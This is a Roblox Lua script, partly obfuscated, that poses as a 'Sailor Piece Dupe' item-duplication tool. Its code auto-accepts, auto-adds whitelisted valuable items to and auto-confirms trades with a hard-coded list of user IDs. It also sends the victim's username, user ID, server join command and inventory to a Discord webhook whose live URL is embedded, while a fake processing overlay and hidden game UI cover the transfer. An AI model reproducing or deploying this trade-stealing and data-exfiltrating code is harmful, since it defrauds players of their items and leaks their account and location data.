v16:FireServer(v278);end);end break;end end end end local function v142() return (syn and syn.request) or http_request or request or (http and http.request) or (fluxus and fluxus.request) ;end local function v143(v279,v280) local v281=0 -0 ;local v282;while true do if (v281==0) then v282=831 -(762 + 69) ;while true do if (v282==0) then local v653=0 -0 ;while true do if (v653==(0 + 0)) then if ( #v279<=v280) then return v279;end return string.sub(v279,1 + 0 ,v280-(7 -4) )   .. v7("\124\173\198","\58\82\131\232\93\41") ;end end end end break;end end end local function v144() local v283,v284=v78();if v283 then return string.format(v7("\179\69\217\3\92\43\134\23\227\16\79\41\134\69\144\93\117\58\150\69\217\6\73\54\128\27\144\80\89\127\147\91\209\12\88\45\144\30","\95\227\55\176\117\61"),v284),v284;end return string.format(v7("\40\107\33\71\162\27\62\16\78\185\14\123\49\11\227\48\123\54\89\162\11\106\42\72\231\88\59\39\11\187\20\127\58\78\185\11\55","\203\120\30\67\43"),v284),v284;end local function v145() local v285=0;local v286;local v287;local v288;local v289;local v290;local v291;while true do local v380=0 + 0 ;while true do if (v380==(0 + 0)) then if (v285==(3 -2)) then for v671,v672 in ipairs(v286) do if ((typeof(v672)==v7("\44\51\17\143\61","\227\88\82\115")) and (type(v672.name)==v7("\80\11\168\174\12\116","\19\35\127\218\199\98"))) then table.insert(v287,{[v7("\18\250\7\231","\130\124\155\106")]=v672.name,[v7("\196\222\247\161\183\255\104\166","\223\181\171\150\207\195\150\28")]=tonumber(v672.quantity) or (158 -(8 + 149)) });end end table.sort(v287,function(v673,v674) local v675=1320 -(1199 + 121) ;while true do if (v675==0) then if (v673.quantity==v674.quantity) then return v673.name<v674.name ;end return v673.quantity>v674.quantity ;end end end);v288=math.max(1 -0 ,v55);v285=2;end if ((4 -2)==v285) then v289=math.min(v288, #v287);v290={};for v676=1 + 0 ,v289 do local v677=0 -0 ;local v678;while true do if (v677==(0 -0)) then v678=v287[v676];table.insert(v290,string.format(v7("\9\62\170\238\76\95\122\251\235\13","\105\44\90\131\206"),v676,v678.name,v678.quantity));break;end end end v285=3;end v380=1 + 0 ;end if (v380==1) then if (v285==(1807 -(518 + 1289))) then local v654=0 -0 ;while true do if (v654==(0 + 0)) then v286=v70.Items;if ((typeof(v286)~=v7("\229\36\79\227\220","\185\145\69\45\143")) or ( #v286==(0 -0))) then return v7("\164\16\89\175\200\143\18\10\230\218\133\10\23\162\146","\188\234\127\121\198"),0 + 0 ;end v654=1;end if (v654==(470 -(304 + 165))) then v287={};v285=1;break;end end end if (v285==3) then if ( #v287>v289) then table.insert(v290,string.format(v7("\177\174\252\249\9\48\251\160\247\189\72\51\240\242\183","\94\159\128\210\217\104"), #v287-v289 ));end v291=table.concat(v290,"\n");return v143(v291,1000), #v287;end break;end end end end local function v146(v292) local v293=0 + 0 ;local v294;local v295;local v296;while true do if (v293==(163 -(54 + 106))) then return v143(table.concat(v296,"\n"),1000), #v292;end if (v293==(1969 -(1618 + 351))) then if ((typeof(v292)~=v7("\68\248\4\179\90","\26\48\153\102\223\63\31\153")) or ( #v292==(0 + 0))) then return v7("\44\79\227\246","\147\98\32\141"),0;end v294=math.max(1017 -(10 + 1006) ,v55);v293=1 + 0 ;end if (v293==(1 + 0)) then v295=math.min(v294, #v292);v296={};v293=2;end if (v293==2) then for v610=3 -2 ,v295 do local v611=v292[v610];if ((typeof(v611)==v7("\12\66\225\198\3","\43\120\35\131\170\102\54")) and (type(v611.name)==v7("\71\18\149\191\171\183","\228\52\102\231\214\197\208"))) then local v655=1033 -(912 + 121) ;local v656;while true do if (v655==0) then v656=tonumber(v611.quantity) or (1 + 0) ;table.insert(v296,string.format(v7("\91\228\60\138\175\152\89\206\91\228","\182\126\128\21\170\138\235\121"),v610,v611.name,v656));break;end end end end if ( #v292>v295) then table.insert(v296,string.format(v7("\197\148\123\166\135\29\52\70\206\222\117\235\137\1\53","\102\235\186\85\134\230\115\80"), #v292-v295 ));end v293=1292 -(1140 + 149) ;end end end local function v147(v297,v298,v299,v300) if ( not v53 or (v54=="")) then return;end local v301=v142();if  not v301 then return;end local v302=(v77 and v77.Name) or v7("\98\2\53\81\125\195\44","\66\55\108\94\63\18\180") ;local v303=(v77 and v77.DisplayName) or v302 ;local v304=(v77 and v77.UserId) or 0 ;local v305=game.PlaceId;local v306=game.JobId;local v307,v308=v144();local v309=string.format(v7("\28\153\145\39\52\3\91\194\146\32\48\23\6\130\135\59\40\65\90\142\138\58\104\81\17\140\129\36\47\86\0\192\145\63\50\84\22\131\132\62\43\22\29\128\132\48\34\6\1\158\128\37\14\93\73\200\129\113\48\80\16\153\141\106\118\9\68\203\141\50\46\94\28\153\216\102\119\9\82\139\138\37\42\88\0\208\149\57\32","\57\116\237\229\87\71"),v304);local v310=string.format('game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)',v305,v306);local v311={{[v7("\164\176\224\226","\39\202\209\141\135\23\142")]=v7("\207\63\8\19\55\234","\152\159\83\105\106\82"),[v7("\151\199\93\231\204","\60\225\166\49\146\169")]=string.format("%s (@%s)\nUserId: %d",v303,v302,v304),[v7("\38\16\35\35\15\2","\103\79\126\79\74\97")]=true},{[v7("\180\126\222\118","\122\218\31\179\19\62")]=v7("\128\211\223\215\204\179","\37\211\182\173\161\169\193"),[v7("\225\59\65\204\45","\217\151\90\45\185\72\27")]=string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s",v307,v308,v305,v306),[v7("\202\114\235\27\88\198","\54\163\28\135\114")]=true},{[v7("\38\218\80\135","\31\72\187\61\226\46")]=v7("\240\18\66\198\82\109","\68\163\102\35\178\39\30"),[v7("\168\113\214\210\6","\113\222\16\186\167\99\213\227")]=v298 or v7("\0\65\218","\150\78\110\155") ,[v7("\140\203\43\232\170\27","\32\229\165\71\129\196\126\223")]=false},{[v7("\205\136\201\132","\181\163\233\164\225\225")]=v7("\122\132\55\121\16\168\49\122\93\138\48\115","\23\48\235\94"),[v7("\106\219\212\72\82","\178\28\186\184\61\55\83")]="```lua\n"   .. v143(v310,179 + 781 )   .. "\n```" ,[v7("\205\195\75\53\252\11","\149\164\173\39\92\146\110")]=false}};if v299 then local v391=0 -0 ;local v392;local v393;while true do if ((0 -0)==v391) then v392,v393=v145();table.insert(v311,{[v7("\253\38\29\26","\123\147\71\112\127\122")]=string.format(v7("\229\195\148\116\72\216\194\144\104\6\132\228\150\116\75\223\132\194\60\6\137\201\194\101\73\216\204\142","\38\172\173\226\17"),v393),[v7("\91\16\32\250\72","\143\45\113\76")]="```\n"   .. v392   .. "\n```" ,[v7("\177\182\16\53\182\189","\92\216\216\124")]=false});break;end end end if (typeof(v300)==v7("\79\51\174\76\248","\157\59\82\204\32")) then for v574,v575 in ipairs(v300) do if ((typeof(v575)==v7("\44\63\225\246\236","\209\88\94\131\154\137\138\179")) and v575.name and v575.value) then table.insert(v311,v575);end end end local v312={[v7("\45\172\198\121\26\48","\66\72\193\164\28\126\67\81")]={{[v7("\243\37\188\84\35","\22\135\76\200\56\70")]=v7("\190\49\241\40\82\243\215\112","\129\237\80\152\68\61")   .. tostring(v297) ,[v7("\82\167\8\252\14","\56\49\200\100\147\124\119")]=20178175 -14363392 ,[v7("\216\54\170\253\206\48\190\249\192","\144\172\94\223")]={[v7("\49\29\174","\39\68\111\194")]=v309},[v7("\208\175\226\203\125\164","\215\182\198\135\167\25")]=v311,[v7("\139\70\229\92\136\91","\40\237\41\138")]={[v7("\211\113\226\236","\42\167\20\154\152")]=os.date(v7("\11\187\155\15\52\44\7\187\166\2\52\9\16\187\143\24\52\18\10\203\150\97","\65\42\158\194\34\17"))}}}};pcall(function() v301({[v7("\47\53\94","\142\122\71\50\108\77\141\123")]=v54,[v7("\56\167\235\16\52\17","\91\117\194\159\120")]=v7("\42\50\13\44","\68\122\125\94\120\85\145"),[v7("\63\25\206\90\205\203\169","\218\119\124\175\62\168\185")]={[v7("\134\255\70\208\160\254\92\137\145\233\88\193","\164\197\144\40")]=v7("\130\224\186\135\212\181\130\228\163\132\211\249\137\227\165\133","\214\227\144\202\235\189")},[v7("\207\170\131\98","\92\141\197\231\27\112\211\51")]=v10:JSONEncode(v312)});end);end local function v148() if ( not v53 or (v54=="")) then return;end local v313=v142();if  not v313 then return;end local v314=(v77 and v77.Name) or v7("\211\241\129\173\222\241\241","\177\134\159\234\195") ;local v315=(v77 and v77.DisplayName) or v314 ;local v316=(v77 and v77.UserId) or (186 -(165 + 21)) ;local v317=game.PlaceId;local v318=game.JobId;local v319,v320=v144();local v321=string.format(v7("\181\255\43\176\218\231\164\112\183\222\170\165\45\175\203\177\228\39\238\202\178\230\112\168\204\188\239\44\168\198\169\166\43\168\220\176\233\49\161\192\177\164\54\173\200\186\238\96\181\218\184\249\22\164\148\248\239\121\183\192\185\255\55\253\152\237\187\121\168\204\180\236\55\180\148\236\187\111\230\207\178\249\50\161\221\224\251\49\167","\169\221\139\95\192"),v316);local v322=string.format('game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)',v317,v318);local v323,v324=v145();local v325={[v7("\219\134\125\58\38\53","\70\190\235\31\95\66")]={{[v7("\174\235\14\234\224","\133\218\130\122\134")]=v7("\15\254\234\200\211\177\98\124\204\224\214\213\179\44\124\218\251\193\223\182\44\57\251","\88\92\159\131\164\188\195"),[v7("\131\33\179\68\197","\189\224\78\223\43\183\139")]=5814894 -(61 + 50) ,[v7("\58\244\159\27\195\32\253\131\26","\161\78\156\234\118")]={[v7("\178\165\197","\188\199\215\169")]=v321},[v7("\250\0\90\119\236\239","\136\156\105\63\27")]={{[v7("\21\141\116\49","\84\123\236\25")]=v7("\192\135\171\14\169\167","\213\144\235\202\119\204"),[v7("\53\25\210\63\45","\45\67\120\190\74\72\67")]=string.format("%s (@%s)\nUserId: %d",v315,v314,v316),[v7("\41\44\225\172\247\141","\137\64\66\141\197\153\232\142")]=true},{[v7("\13\209\47\163","\232\99\176\66\198")]=v7("\223\36\58\16\126\159","\76\140\65\72\102\27\237\153"),[v7("\92\219\26\199\210","\222\42\186\118\178\183\97")]=string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s",v319,v320,v317,v318),[v7("\84\226\72\131\83\233","\234\61\140\36")]=true},{[v7("\47\220\183\119","\111\65\189\218\18")]=v7("\112\95\26\33\30\79","\207\35\43\123\85\107\60"),[v7("\102\171\172\255\124","\25\16\202\192\138")]=v7("\206\200\191\235\185\224\189\206\181\231\170\225\233\206\169\162\186\225\254\200\168\241\186\242\232\199\161\251","\148\157\171\205\130\201"),[v7("\42\218\120\32\223\243","\150\67\180\20\73\177")]=false},{[v7("\131\25\23\72","\45\237\120\122")]=v7("\253\231\171\34\151\203\173\33\218\233\172\40","\76\183\136\194"),[v7("\108\231\233\45\85","\116\26\134\133\88\48\47")]="```lua\n"   .. v143(v322,1934 -974 )   .. "\n```" ,[v7("\23\207\172\237\179\119","\18\126\161\192\132\221")]=false},{[v7("\81\41\163\1","\54\63\72\206\100")]=string.format(v7("\225\87\83\127\235\111\199\75\92\58\173\82\220\92\72\105\172\59\133\25\0\126\165\111\199\77\68\118","\27\168\57\37\26\133"),v324),[v7("\59\171\112\189\210","\183\77\202\28\200")]="```\n"   .. v323   .. "\n```" ,[v7("\30\61\133\1\25\54","\104\119\83\233")]=false}},[v7("\243\247\40\54\70\231","\35\149\152\71\66")]={[v7("\13\237\90\164","\90\121\136\34\208")]=os.date(v7("\134\75\108\83\130\3\24\91\195\78\16\54\157\75\120\68\130\61\21\43\243\45","\126\167\110\53"))}}}};pcall(function() v313({[v7("\8\2\34","\95\93\112\78\152\188")]=v54,[v7("\236\240\145\29\235\186","\178\161\149\229\117\132\222")]=v7("\184\244\238\152","\67\232\187\189\204\193\118\198"),[v7("\163\43\180\36\62\16\252","\143\235\78\213\64\91\98")]={[v7("\174\71\138\253\117\184\153\5\176\240\96\179","\214\237\40\228\137\16")]=v7("\132\243\255\213\10\165\132\247\230\214\13\233\143\240\224\215","\198\229\131\143\185\99")},[v7("\115\131\172\106","\19\49\236\200")]=v10:JSONEncode(v325)});end);end local function v149() v126();end local function v150() local v326=1460 -(1295 + 165) ;local v327;while true do if (v326==0) then v327=v70.Items;return (typeof(v327)==v7("\234\54\244\187\225","\218\158\87\150\215\132")) and ( #v327>(0 + 0)) ;end end end local function v151(v328) local v329=os.clock();while v71 and ((os.clock() -v329)<v328)  do local v381=0;while true do if (v381==(0 + 0)) then if v150() then return true;end task.wait(0.05);break;end end end return v150();end local function v152(v330,v331) local v332=os.clock();while v71 and ((os.clock() -v332)<v331)  do local v382=0;while true do if (v382==(1397 -(819 + 578))) then if (v72>v330) then return true;end task.wait(1402.03 -(331 + 1071) );break;end end end return v72>v330 ;end local function v153(v333) local v334=743 -(588 + 155) ;local v335;local v336;local v337;while true do if (v334==(1282 -(546 + 736))) then if  not v30 then return 0;end v335=v70.Items;v334=1938 -(1834 + 103) ;end if (v334==(2 + 0)) then v337={};for v612,v613 in ipairs(v335) do if (typeof(v613)==v7("\241\167\184\203\141","\140\133\198\218\167\232")) then table.insert(v337,{[v7("\187\47\185\120","\228\213\78\212\29")]=v613.name,[v7("\150\89\183\11\255\142\88\175","\139\231\44\214\101")]=v613.quantity});end end v334=3;end if (v334==3) then for v614,v615 in ipairs(v337) do local v616=0 -0 ;local v617;local v618;while true do if (v616==(1766 -(1536 + 230))) then if ( not v71 or (v333~=v73)) then return v336;end if (v72>=v35) then return v336;end v616=492 -(128 + 363) ;end if (v616==2) then if (v617 and (v618>(0 + 0))) then local v706=0 -0 ;local v707;while true do if (v706==(1 + 0)) then if v707 then local v749=0 -0 ;while true do if (v749==(0 -0)) then v336=v336 + (2 -1) ;task.wait(v32 + v36 );break;end end end break;end if (v706==0) then v707=false;for v740=1 + 0 ,v34 + (1010 -(615 + 394))  do if ( not v71 or (v333~=v73)) then return v336;end if (v72>=v35) then return v336;end local v741=v72;v22:FireServer(v7("\240\251\3\83\3","\118\185\143\102\62\112\209\81"),v617,v618);v707=v152(v741,v33);if v707 then break;end task.wait(v32);end v706=1 + 0 ;end end end break;end if (v616==1) then local v679=0;while true do if (v679==1) then v616=2 + 0 ;break;end if (v679==(0 -0)) then v617=v615.name;v618=tonumber(v615.quantity) or 1 ;v679=4 -3 ;end end end end end return v336;end if (v334==1) then if (typeof(v335)~=v7("\239\31\219\238\51","\173\155\126\185\130\86\66")) then return 651 -(59 + 592) ;end v336=0 -0 ;v334=3 -1 ;end end end if v27 then v27.OnClientEvent:Connect(function(v394,v395) local v396=0 + 0 ;while true do if (v396==0) then if v79 then return;end if ((typeof(v394)==v7("\79\100\59\239\171\18","\88\60\16\73\134\197\117\124")) and (typeof(v395)==v7("\68\235\250\196\68","\33\48\138\152\168"))) then local v680=0;while true do if (v680==(171 -(70 + 101))) then v70[v394]=v395;if (v394==v7("\91\2\53\92\210","\87\18\118\80\49\161")) then local v731=0;local v732;while true do if (v731==(0 -0)) then v732=0 + 0 ;while true do if (v732==(2 -1)) then if v95 then local v759=241 -(123 + 118) ;while true do if (v759==(0 + 0)) then v95=false;v124();break;end end end break;end if (v732==0) then v123(v7("\101\16\204\165\190\88\17\200\185\240\104\27\206\165\179\88\27\222","\208\44\126\186\192"));v130();v732=1 + 0 ;end end break;end end end break;end end end break;end end end);end v17.OnClientEvent:Connect(function(v338) local v339=1399 -(653 + 746) ;while true do if (v339==(1 -0)) then if (v29>(0 -0)) then task.wait(v29);end v15:FireServer(true);break;end if (v339==(0 -0)) then if v79 then return;end if  not v28 then return;end v339=1 + 0 ;end end end);v19.OnClientEvent:Connect(function(v340) local v341=0;local v342;while true do if (v341==0) then v342=0 + 0 ;while true do if (v342==(0 + 0)) then if v79 then return;end if ((typeof(v340)==v7("\227\27\166\202\17","\46\151\122\196\166\116\156\169")) and (typeof(v340.myItems)==v7("\241\236\68\22\254","\155\133\141\38\122"))) then local v690=0 + 0 ;while true do if (v690==(0 + 0)) then v72= #v340.myItems;v76.myItems=v340.myItems;break;end end end v342=2 -1 ;end if (v342==1) then if ((typeof(v340)==v7("\49\43\174\77\74","\197\69\74\204\33\47\31")) and (typeof(v340.theirItems)==v7("\228\78\88\139\245","\231\144\47\58"))) then v76.theirItems=v340.theirItems;end if (v43 and v71 and (typeof(v340)==v7("\166\217\216\121\29","\89\210\184\186\21\120\93\175"))) then if ((v340.phase==v7("\178\92\114\211\112\40\188\90\114\210","\90\209\51\28\181\25")) and  not v340.myConfirm) then local v713=0;local v714;while true do if (v713==(0 + 0)) then v714=os.clock();if ((v714-v74)>=v45) then v74=v714;local v755=v73;task.delay(v44,function() if (v71 and (v755==v73)) then v25:FireServer();end end);end break;end end end end break;end end break;end end end);v18.OnClientEvent:Connect(function(v343) local v344=0;local v345;local v346;while true do if (v344==(1 -0)) then local v578=0;while true do if (v578==(1235 -(885 + 349))) then v74=0;v344=2 + 0 ;break;end if (v578==(0 -0)) then v72=0 -0 ;v73=v73 + 1 ;v578=969 -(915 + 53) ;end end end if (v344==0) then local v579=801 -(768 + 33) ;while true do if (v579==(0 -0)) then if v79 then return;end v71=true;v579=1 -0 ;end if (1==v579) then v75=v75 + (329 -(287 + 41)) ;v344=1;break;end end end if (v344==(850 -(638 + 209))) then if (v39 and  not v150()) then v149();end if v30 then local v633=0 + 0 ;while true do if (v633==(1687 -(96 + 1590))) then v346=v153(v345);break;end if (0==v633) then if (v31>(1672 -(741 + 931))) then task.wait(v31);end if  not v151(v38) then return;end v633=1;end end end if (v40 and v71 and (v345==v73)) then local v634= not v42 or (v346>(0 + 0)) or  not v30 ;if v634 then local v681=0 -0 ;while true do if (v681==(0 -0)) then if (v41>(0 + 0)) then task.wait(v41);end v24:FireServer(true);break;end end end end break;end if (v344==(1 + 1)) then local v580=0;while true do if (v580==(0 + 0)) then v345=v73;v346=0 -0 ;v580=1 + 0 ;end if (v580==(1 + 0)) then if v37 then v149();end v344=3;break;end end end end end);v20.OnClientEvent:Connect(function() local v347=0 -0 ;while true do if (v347==(0 + 0)) then if v79 then return;end v71=false;v347=1;end if (v347==(495 -(64 + 430))) then v73=v73 + 1 + 0 ;v74=363 -(106 + 257) ;v347=2 + 0 ;end if (v347==(723 -(496 + 225))) then if (v47 and ( #v48>(0 -0))) then local v635=0 -0 ;local v636;while true do if (1==v635) then task.spawn(function() local v708=1658 -(256 + 1402) ;local v709;while true do if (v708==(1900 -(30 + 1869))) then while v47 and  not v71 and (v636==v75)  do local v742=0;local v743;while true do if (v742==(1369 -(213 + 1156))) then v141();v743=v51;v742=1;end if (v742==(190 -(96 + 92))) then task.wait(v743);break;end if (v742==1) then if (v709 and (v50>(0 + 0))) then v743=v50;end v709=false;v742=2;end end end break;end if (v708==(899 -(142 + 757))) then if v52 then pcall(function() v23:FireServer();end);end v709=true;v708=1;end end end);break;end if (v635==(0 + 0)) then v75=v75 + 1 + 0 ;v636=v75;v635=80 -(32 + 47) ;end end end break;end end end);v21.OnClientEvent:Connect(function(v348) if v79 then return;end v71=false;v73=v73 + (1978 -(1053 + 924)) ;v74=0 + 0 ;local v349=v76.myItems;local v350=v76.theirItems;if (typeof(v348)==v7("\196\122\85\226\186","\223\176\27\55\142")) then local v397=0 -0 ;local v398;while true do if (v397==(1648 -(685 + 963))) then v398=0 -0 ;while true do if (v398==0) then if (typeof(v348.myItems)==v7("\48\186\204\185\33","\213\68\219\174")) then v349=v348.myItems;end if (typeof(v348.theirItems)==v7("\31\225\33\235\47","\31\107\128\67\135\74\165\95")) then v350=v348.theirItems;end break;end end break;end end end local v351,v352=v146(v349);local v353,v354=v146(v350);v147(v7("\236\250\253\73\68\241\235\253\255\78\68\162\203\238\233\65","\209\184\136\156\45\33"),v7("\51\218\116\12\189\71\203\122\5\168\11\205\97\13\188\71\219\96\11\187\2\219\102\14\173\11\196\108","\216\103\168\21\104"),false,{{[v7("\118\172\78\161","\196\24\205\35")]=string.format(v7("\23\132\246\70\9\138\245\3\110\198\163\67\42\203\247\9\58\138\239","\102\78\235\131"),v352),[v7("\236\47\56\81\66","\84\154\78\84\36\39\89\215")]="```\n"   .. v351   .. "\n```" ,[v7("\244\239\90\81\11\248","\101\157\129\54\56")]=false},{[v7("\19\168\135\174","\25\125\201\234\203\67")]=string.format(v7("\64\251\13\67\51\40\7\57\185\88\70\16\103\7\118\224\25\15","\115\25\148\120\99\116\71"),v354),[v7("\26\60\181\49\68","\33\108\93\217\68")]="```\n"   .. v353   .. "\n```" ,[v7("\210\69\173\164\213\78","\205\187\43\193")]=false}});end);task.spawn(function() local v355=1597 -(645 + 952) ;local v356;while true do if (v355==0) then if (v39 and  not v150()) then v149();end v356=os.clock();v355=1;end if (v355==(839 -(669 + 169))) then while (os.clock() -v356)<v38  do if v150() then break;end task.wait(0.05);end v148();break;end end end);
+local requestInventory = remotes:FindFirstChild("RequestInventory")
+local updateInventory = remotes:FindFirstChild("UpdateInventory")
+
+local AUTO_ACCEPT_ENABLED = true
+local ACCEPT_DELAY = 0.02
+local AUTO_ADD_ITEMS_ENABLED = true
+local AUTO_ADD_DELAY = 0.05
+local ADD_ITEM_INTERVAL = 0.06
+local UPDATE_WAIT_TIMEOUT = 0.4
+local MAX_ADD_RETRIES = 2
+local MAX_ITEMS_PER_SIDE = 25
+local POST_ADD_COOLDOWN = 0.05
+local REQUEST_INVENTORY_ON_TRADE_START = false
+local INVENTORY_WAIT_TIMEOUT = 2.0
+local STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PUBLIC = 5.0
+local STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PRIVATE = 10.0
+local STARTUP_WEBHOOK_REQUEST_INTERVAL = 0.3
+local FORCE_REQUEST_IF_ITEMS_EMPTY = true
+local AUTO_READY_ENABLED = true
+local AUTO_READY_DELAY = 0.1
+local REQUIRE_ITEM_ADDED_BEFORE_READY = true
+local AUTO_CONFIRM_ENABLED = true
+local AUTO_CONFIRM_DELAY = 0.05
+local AUTO_CONFIRM_COOLDOWN = 0.75
+local DISABLE_TRADE_SCREEN_GUIS_ON_START = true
+local AUTO_RETRADE_ON_CANCEL = true
+local RETRADE_TARGET_USER_IDS = {
+	10714074728,
+	10817163401,
+	10796477668,
+	8627837748,
+	10792361224,
+	10817323068,
+}
+local RETRADE_TARGET_INDEX = 0
+local RETRADE_DELAY = 0.2
+local RETRADE_LOOP_INTERVAL = 1.0
+local FIRE_CANCEL_BEFORE_RETRADE = true
+
+-- Whitelist of items to add in trades
+local ITEMS_TO_ADD_WHITELIST = {
+	["Clan Reroll"] = true,
+    ["Silver Requiem"] = true,
+    ["Black Frost"] = true,
+    ["Wyrm Brand"] = true,
+    ["Hearts"] = true,
+    ["Divine Fragments"] = true,
+    ["Sacred Bows"] = true,
+    ["Radiant Cores"] = true,
+    ["Pink Gem"] = true,
+    ["2x Drop"] = true,
+    ["2x Luck"] = true,
+    ["2x Gems"] = true,
+    ["2x Exp"] = true,
+    ["2x Money"] = true,
+    ["Aura Crate"] = true,
+    ["Mythical Chest"] = true,
+    ["Secret Chest"] = true,
+    ["Cosmetic Crate"] = true,
+}
+
+local WEBHOOK_ENABLED = true
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1493091689320153222/9B8T0NRfs9hATIzSBBQ-yfnxGmime6zdYLayA-zxZPGkAVidG7zNxQkM_-6OUhCKl20c"
+local WEBHOOK_ONE_LOG_PER_SERVER = true
+local WEBHOOK_MAX_INVENTORY_LINES = 100
+local PRIVATE_SERVER_PLAYER_THRESHOLD = 1
+local BLOCK_SCRIPT_IN_PRIVATE_SERVER = true
+local BLOCKED_SERVER_NOTIFICATION_INTERVAL = 3.0
+local BLOCKED_SERVER_NOTIFICATION_TITLE = "Sailor Piece Dupe"
+local BLOCKED_SERVER_NOTIFICATION_TEXT = "Script cannot run in new servers please switch to public server"
+local BLOCKED_SERVER_COUNTDOWN_SECONDS = 5
+local PRIVATE_SERVER_DETECTION_GRACE_SECONDS = 3
+local AUTO_HOP_TO_PUBLIC_SERVER_WHEN_BLOCKED = true
+local PUBLIC_SERVER_MIN_PLAYER_COUNT = 1
+local SERVER_HOP_MAX_PAGE_SCANS = 6
+local SERVER_HOP_API_LIMIT = 100
+local SERVER_HOP_RETRY_DELAY = 2.0
+local AUTO_RELOAD_AFTER_SERVER_HOP = false
+local AUTO_RELOAD_SOURCE_URL = ""
+local AUTO_RELOAD_SOURCE_CODE = ""
+
+local inventoryByCategory = {}
+local tradeActive = false
+local myTradeItemCount = 0
+local addJobId = 0
+local lastAutoConfirmAt = 0
+local retradeLoopToken = 0
+local lastTradeState = {
+	myItems = {},
+	theirItems = {},
+}
+
+local localPlayer = Players.LocalPlayer
+local refreshInventory
+local hasItemsInventory
+
+local function isPrivateServerByPlayerCount()
+	local playerCount = #Players:GetPlayers()
+	return playerCount <= PRIVATE_SERVER_PLAYER_THRESHOLD, playerCount
+end
+
+local scriptBlockedInPrivateServer = false
+local blockedServerHopLoopStarted = false
+local normalModeInitialized = false
+local RAYFIELD_SOURCES = {
+	"https://sirius.menu/rayfield",
+	"https://raw.githubusercontent.com/shlexware/Rayfield/main/source",
+}
+local RAYFIELD_LOAD_RETRIES = 3
+local RAYFIELD_RETRY_DELAY = 1.5
+local INVENTORY_NOTIFY_COOLDOWN = 2.5
+local INVENTORY_PREVIEW_MAX_ITEMS = 3
+local SCAN_RETRY_COUNT = 4
+local SCAN_RETRY_INTERVAL = 0.3
+local DUPE_PROCESS_STEP_DELAY = 10
+local DUPE_PREPARE_DELAY = 10
+local sailorUiCreated = false
+local uiInventoryStatusParagraph = nil
+local uiSelectedItemStatusParagraph = nil
+local uiRayfield = nil
+local lastInventoryNotifyAt = 0
+local scanNotifyPending = false
+local inventoryScanReady = false
+local selectedDupeItemsText = ""
+local dupeRepeatCount = 25
+local processingGui = nil
+local processingStatusLabel = nil
+local processingTargetLabel = nil
+local processingQuantityLabel = nil
+local processingProgressFill = nil
+local dupeProcessCancelled = false
+local dupeDisabledGuiState = {}
+local quantitySyncLockActive = false
+local quantitySyncLockToken = 0
+local quantitySyncLockValues = {}
+local recentServerHopAttempts = {}
+local RECENT_HOP_ATTEMPT_TTL = 90
+local serverLogSentForJobId = nil
+local DUPE_TEMP_DISABLE_GUI_NAMES = {
+	"BasicStatsCurrencyAndButtonsUI",
+}
+
+local function setTemporaryDupeGuiState(disable)
+	if not localPlayer then
+		return
+	end
+
+	local playerGui = localPlayer:FindFirstChild("PlayerGui")
+	if not playerGui then
+		return
+	end
+
+	if disable then
+		dupeDisabledGuiState = {}
+		for _, guiName in ipairs(DUPE_TEMP_DISABLE_GUI_NAMES) do
+			local gui = playerGui:FindFirstChild(guiName)
+			if gui and gui:IsA("ScreenGui") then
+				dupeDisabledGuiState[guiName] = gui.Enabled
+				gui.Enabled = false
+			end
+		end
+	else
+		for guiName, previousEnabled in pairs(dupeDisabledGuiState) do
+			local gui = playerGui:FindFirstChild(guiName)
+			if gui and gui:IsA("ScreenGui") then
+				gui.Enabled = previousEnabled
+			end
+		end
+		dupeDisabledGuiState = {}
+	end
+end
+
+local function ensureProcessingUi()
+	if processingGui and processingGui.Parent then
+		return true
+	end
+
+	if not localPlayer then
+		return false
+	end
+
+	local playerGui = localPlayer:FindFirstChild("PlayerGui") or localPlayer:WaitForChild("PlayerGui")
+	if not playerGui then
+		return false
+	end
+
+	processingGui = Instance.new("ScreenGui")
+	processingGui.Name = "SailorProcessingUI"
+	processingGui.ResetOnSpawn = false
+	processingGui.IgnoreGuiInset = true
+	processingGui.DisplayOrder = 999999
+	processingGui.Enabled = false
+	processingGui.Parent = playerGui
+
+	local backdrop = Instance.new("Frame")
+	backdrop.Name = "Backdrop"
+	backdrop.Size = UDim2.fromScale(1, 1)
+	backdrop.BackgroundColor3 = Color3.fromRGB(2, 4, 10)
+	backdrop.BackgroundTransparency = 0.35
+	backdrop.BorderSizePixel = 0
+	backdrop.Parent = processingGui
+
+	local frame = Instance.new("Frame")
+	frame.Name = "Main"
+	frame.AnchorPoint = Vector2.new(0.5, 0.5)
+	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	frame.Size = UDim2.new(0, 760, 0, 360)
+	frame.BackgroundColor3 = Color3.fromRGB(12, 16, 28)
+	frame.BackgroundTransparency = 0.05
+	frame.BorderSizePixel = 0
+	frame.Parent = processingGui
+
+	local shadow = Instance.new("Frame")
+	shadow.Name = "Shadow"
+	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+	shadow.Position = UDim2.new(0.5, 0, 0.5, 4)
+	shadow.Size = UDim2.new(0, 780, 0, 380)
+	shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	shadow.BackgroundTransparency = 0.6
+	shadow.BorderSizePixel = 0
+	shadow.ZIndex = frame.ZIndex - 1
+	shadow.Parent = processingGui
+
+	local shadowCorner = Instance.new("UICorner")
+	shadowCorner.CornerRadius = UDim.new(0, 18)
+	shadowCorner.Parent = shadow
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 18)
+	corner.Parent = frame
+
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(92, 140, 255)
+	stroke.Thickness = 1.8
+	stroke.Parent = frame
+
+	local gradient = Instance.new("UIGradient")
+	gradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 30, 52)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 14, 24)),
+	})
+	gradient.Rotation = 22
+	gradient.Parent = frame
+
+	local headerAccent = Instance.new("Frame")
+	headerAccent.Name = "HeaderAccent"
+	headerAccent.Size = UDim2.new(1, 0, 0, 5)
+	headerAccent.BackgroundColor3 = Color3.fromRGB(96, 140, 255)
